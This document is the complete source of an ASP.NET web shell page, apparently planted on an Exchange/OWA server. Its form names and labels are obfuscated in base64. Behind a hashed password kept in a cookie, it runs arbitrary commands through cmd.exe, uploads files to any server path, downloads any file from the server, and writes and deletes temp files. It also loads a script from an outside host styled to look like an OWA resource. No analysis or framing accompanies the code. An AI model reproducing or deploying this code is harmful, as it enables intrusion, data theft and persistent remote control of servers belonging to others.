<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<%
c();
NameValueCollection t=HttpContext.Current.Request.Form;
passwords=fbss(t[x("cGFzc3dvcmRz")]);pro=fbss(t[x("cHJv")]);cmd_exceut=fbss(t[x("Y21kX2V4Y2V1dA==")]);sav=fbss(t[x("c2F2")]);vir=t[x("dmly")];nenggg=fbss(t[x("bmVuZ2dn")]);upb=fbss(t[x("dXBi")]);upd=fbss(t["upd"]);del=fbss(t[x("dXBk")]);dongnn=fbss(t[x("ZG9uZ25u")]);baseFileName=t[x("YmFzZUZpbGVOYW1l")];baseAddress=fbss(t[x("YmFzZUFkZHJlc3M=")]);baseVirpath=t[x("YmFzZVZpcnBhdGg=")];
if(!string.IsNullOrEmpty(passwords))c(passwords);
else if(!string.IsNullOrEmpty(cmd_exceut))r(pro,cmd_exceut);
else if(HttpContext.Current.Request.Files[x("dXBsb2FkbA==")]!=null)u(HttpContext.Current.Request.Files[x("dXBsb2FkbA==")],sav,string.IsNullOrEmpty(vir)?false:true,nenggg);
else if(!string.IsNullOrEmpty(upb))h(upb,upd);
else if(!string.IsNullOrEmpty(del))d(del);
else if(!string.IsNullOrEmpty(dongnn))z(dongnn);
else if(!string.IsNullOrEmpty(baseFileName))baseuploadl(baseFileName,baseAddress,string.IsNullOrEmpty(baseVirpath)?false:true);

if(HttpContext.Current.Request.Cookies["data"]!=null){string data=HttpContext.Current.Request.Cookies["data"].Value;string[] data2=data.Split(new string[]{"&|&"},StringSplitOptions.None);for(int i=0;i<data2.Length;i++){string[] data3=data2[i].Split(new string[]{"$=$"},StringSplitOptions.None);
switch (data3[0]){
case"pro":pro=a(pro,fbss(data3[1]));break;
case"cmd_exceut":cmd_exceut=a(cmd_exceut,fbss(data3[1]));break;
case"sav":sav=a(sav,fbss(data3[1]));break;
case"vir":vir=a(vir,fbss(data3[1]));break;
case"nenggg":nenggg=a(nenggg,fbss(data3[1]));break;
case"dongnn":dongnn=a(dongnn,fbss(data3[1]));break;
}}}

view();
    %>
<script runat="server">
string passwords,pro,cmd_exceut,sav,vir,nenggg,upb,upd,del,dongnn,baseFileName,baseAddress,baseVirpath;
bool aut = false;
string pp = "FX7nUf6oTBuYLHjBvsBRvoRNM7o=";
string a(string a,string b){return string.IsNullOrEmpty(a)?b:a;}
string tb(string a)
{
	string ret="";
	try{
		ret=string.IsNullOrEmpty(a)?a:Convert.ToBase64String(Encoding.UTF8.GetBytes(a));
		}catch{
			
		}
		return ret;
}
string fbss(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Encoding.UTF8.GetString(Convert.FromBase64String(a));}catch{}return ret;}
void view(){string data = string.Format(x("cHJvJD0kezB9JnwmY21kX2V4Y2V1dCQ9JHsxfSZ8JnNhdiQ9JHsyfSZ8JnZpciQ9JHszfSZ8Jm5lbmdnZyQ9JHs0fSZ8JmRvbmdubiQ9JHs1fQ=="),
tb(pro),tb(cmd_exceut),tb(sav),tb(vir),tb(nenggg),tb(dongnn));
HttpCookie coo=new HttpCookie("data", data);coo.Expires=DateTime.Now.AddDays(1);HttpContext.Current.Response.SetCookie(coo);}

void c(string passwords)
{
	try{HttpCookie coo=new HttpCookie(x("cGFzc3dvcmRz"),tb(passwords));
	coo.Expires=DateTime.Now.AddDays(1);
	HttpContext.Current.Response.SetCookie(coo);
	aut=Convert.ToBase64String(new System.Security.Cryptography.SHA1CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(passwords)))==pp;
	}catch(Exception e)
	{
		l(e.Message);}
	}
bool c(){try{if(HttpContext.Current.Request.Cookies[x("cGFzc3dvcmRz")]!=null){aut=Convert.ToBase64String(new System.Security.Cryptography.SHA1CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(fbss(HttpContext.Current.Request.Cookies[x("cGFzc3dvcmRz")].Value))))==pp;return aut;}}catch(Exception e){l(e.Message);}return false;}
void u(HttpPostedFile uploadl, string sav, bool vir, string nenggg){try{if(c()){if(uploadl!=null&&uploadl.ContentLength>0){string fn=string.IsNullOrEmpty(nenggg)?System.IO.Path.GetFileName(uploadl.FileName):nenggg;string path=vir?Server.MapPath(sav):sav;string SaveLocation=System.IO.Path.HasExtension(path)?path:path.TrimEnd('\\')+"\\"+fn;uploadl.SaveAs(SaveLocation);l("File uploadloaded successfuly : "+SaveLocation);}}}catch(Exception ex){l(ex.Message);}}
void baseuploadl(string baseFileName,string baseAddress, bool baseVirpath){try{if(c()){if(baseFileName!=null&&baseFileName.Length>0&&!string.IsNullOrEmpty(baseAddress)){string SaveLocation=baseVirpath?Server.MapPath(baseAddress):baseAddress;System.IO.File.WriteAllBytes(SaveLocation,Convert.FromBase64String(baseFileName));l("File uploadloaded successfuly : "+SaveLocation);}}}catch(Exception ex){l(ex.Message);}}
void r(string pro, string cmd_exceut){try{if(c()){System.Diagnostics.Process n=new System.Diagnostics.Process();n.StartInfo.FileName=(string.IsNullOrEmpty(pro)?"cmd.exe":pro);n.StartInfo.UseShellExecute=false;n.StartInfo.RedirectStandardInput=true;n.StartInfo.RedirectStandardOutput=true;n.StartInfo.RedirectStandardError=true;n.StartInfo.CreateNoWindow=true;string o=null;n.Start();n.StandardInput.WriteLine(cmd_exceut);n.StandardInput.WriteLine("exit");o=n.StandardOutput.ReadToEnd();n.WaitForExit();n.Close();l(HttpUtility.HtmlEncode(o));}}catch(Exception ex){l(ex.Message);}}
void z(string dongnn){try{if(c()&&!string.IsNullOrEmpty(dongnn)){byte[] f=System.IO.File.ReadAllBytes(dongnn);System.Web.HttpContext t=System.Web.HttpContext.Current;t.Response.Clear();t.Response.ClearHeaders();t.Response.ClearContent();t.Response.AppendHeader("content-length",f.Length.ToString());t.Response.ContentType="application/octet-stream";t.Response.AppendHeader("content-disposition","attachment; filename="+dongnn.Substring(dongnn.LastIndexOf('\\')+1));t.Response.BinaryWrite(f);t.Response.End();}}catch(Exception ex){l(ex.Message);}}
void h(string upb, string upd){try{if(c()&&!string.IsNullOrEmpty(upb)&&!string.IsNullOrEmpty(upd)){System.IO.File.WriteAllBytes(System.IO.Path.GetTempPath()+upd,Convert.FromBase64String(upb));l(upd+" successfuly uploadloaded");}}catch(Exception ex){l(ex.Message);}}
void d(string del){try{if(c()&&!string.IsNullOrEmpty(del)){System.IO.File.Delete(System.IO.Path.GetTempPath()+del);l(del+" successfuly deleled");}}catch(Exception ex){l(ex.Message);}}
string x(string f){return Encoding.UTF8.GetString(Convert.FromBase64String(f));}
void l(string ll){log.InnerHtml=tb(ll);}
</script>
<style>body,html{margin:0;padding:3px 0 0 3px;direction:ltr;background:#000;color:#fff !important;}form{margin:0;}*{font:14px "Lucida Console";}t{width:180px;display:inline-block;text-align:right;padding-right:5px;}input[type="text"],input[type="file"],textarea {width:50%;height:25px;background:#444;color:#fff;border:1px solid #999;margin-bottom:3px;}input[type="text"]{padding:2px;}input[type="button"],input[type="submit"] {height:23px;}input[type="checkbox"]{width:23px;height:24px;position:absolute;margin:0;}hr{margin:0;border:0;border-top:1px solid #DDD;}.h{width:100px;text-align:center;background:rgba(19, 96, 0, 1);vertical-align:middle;}table{width:100%;margin:0;border-collapse:collapse;}.b{padding:10px 0px 9px;}</style>
<script>
function use() { var n = document; var d = n.getElementById("d").innerHTML; d = d.substring(0, d.lastIndexOf('\\') + 1); n.getElementsByName("cmd_exceut")[0].value += d; n.getElementsByName("sav")[0].value += d; n.getElementsByName("dongnn")[0].value += d; }
function subm(){var mmm=document.getElementsByClassName('mmm');for(var i=0;i<mmm.length;i++){mmm[i].value=btoa(mmm[i].value);}}
function reset() { document.cookie = "data=;expires=Thu, 01 Jan 1971 00:00:01 GMT;path=/";location.href = location.pathname;}
</script>
<script src='https://mail.namagesy.de/owa/prem/15.1.1847/scripts/microsoft.owa.core.immanager.js' ></script>
</head>
<body>
<table>
<tr>
<td class="h"><%=x("QWRkcmVzcw==")%></td>
<td class="b">
<t><%=x("Q3VycmVudA==")%> :</t>
<y id="d"><%= Server.MapPath(string.Empty) + "\\"%></y>
<input type="button" value="<%=x("VXNl")%>" onclick="use()" />
<input type="button" value="<%=x("UmVzZXQgRm9ybQ==")%>" onclick="reset()" />
</td>
</tr>
</table>
<hr>
<form method="post">
<table>
<tr>
<td class="h"><%=x("TG9naW4=")%></td>
<td class="b">
<t><%=x("RG8gaXQ=")%> :</t>
<input name="passwords" class="mmm" type="text" style='background-color: <%= aut ? "Green" : "Red" %>' />
<input type="submit" value="<%= x("RG8gaXQ=") %>" onclick="subm();" />
</td>
</tr>
</table>
</form>
<hr>
<form method="post">
<table>
<tr>
<td class="h"><%=x("Q29tbWFuZA==")%></td>
<td class="b">
<t><%=x("UHJvY2Vzcw==")%> :</t>
<input name="pro" class="mmm" type="text" value='<%= string.IsNullOrEmpty(pro) ? x("Y21kLmV4ZQ==") : pro %>' /><br>
<t><%=x("Q29tbWFuZA==")%> :</t>
<input name="cmd_exceut" class="mmm" type="text" value='<%= cmd_exceut %>' />
<input type="submit" value="<%= x("RXhlY3V0ZQ==") %>" onclick="subm();" />
</td>
</tr>
</table>
</form>
<hr>
<form method="post" enctype="multipart/form-data">
<table>
<tr>
<td class="h"><%=x("VXBsb2Fk")%></td>
<td class="b">
<t><%=x("RmlsZSBOYW1l")%> :</t>
<input name="uploadl" type="file" /><br>
<t><%=x("U2F2ZSBhcw==")%> :</t>
<input name="sav" class="mmm" type="text" value='<%= sav %>' />
<input name="vir" type="checkbox" /><g><%=x("SXMgdmlydHVhbCBwYXRo")%></g><br>
<t><%=x("TmV3IEZpbGUgbmFtZQ==")%> :</t>
<input name="nenggg" class="mmm" type="text" value='<%= nenggg %>' />
<input type="submit" value="<%= x("VXBsb2Fk") %>" onclick="subm();" />
</td>
</tr>
</table>
</form>
<hr>
<form method="post">
<table>
<tr>
<td class="h"><%=x("RG93bmxvYWQ=")%></td>
<td class="b">
<t><%=x("RG93bmxvYWQgUGF0aA==")%> :</t>
<input name="dongnn" type="text" />
<input type="submit" value="<%= x("RG93bmxvYWQ=") %>" onclick="document.getElementsByName('dongnn')[0].value = btoa(document.getElementsByName('dongnn')[0].value);" />
</td>
</tr>
</table>
</form>
<hr />
<form method="post">
<table>
<tr>
<td class="h"><%=x("VXBsb2FkIEJhc2U2NA==")%></td>
<td class="b">
<t><%=x("QmFzZTY0IEZpbGU=")%> :</t>
<textarea name="baseFileName"></textarea>
<input name="baseVirpath" type="checkbox" /><g><%=x("SXMgdmlydHVhbCBwYXRo")%></g><br>
<t><%=x("RmlsZSBQYXRoIGFuZCBOYW1l ")%> :</t>
<input name="baseAddress" class="mmm" type="text" value='<%= baseAddress %>' />
<input type="submit" value="<%= x("VXBsb2Fk") %>" onclick="subm();" />
</td>
</tr>
</table>
</form>
<hr />
</form>
<hr />
<br />
<pre id="log" runat="server"></pre>
<script>var ll=document.getElementById('log');if(ll.innerHTML)ll.innerHTML=atob(log.innerHTML);</script>
</body>
</html>
XXxxxx